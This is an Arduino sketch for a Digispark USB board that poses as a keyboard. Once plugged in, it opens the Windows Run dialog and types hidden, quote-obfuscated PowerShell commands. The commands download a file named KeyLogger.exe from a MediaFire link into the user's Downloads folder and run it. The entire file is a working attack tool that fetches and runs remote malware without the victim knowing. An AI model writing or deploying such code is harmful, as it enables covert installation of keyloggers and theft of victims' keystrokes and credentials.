#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://download1081.mediafire.com/9fr7zs654fbg/qk4m7h52dxy9yov/KeyLogger.exe\\\",\\\"$env:UserProfile\\downloads\\KeyLogger.exe\\\");"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.println(F("powershell -windowstyle hidden -command cd downloads; Start-Process KeyLogger.exe"));
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
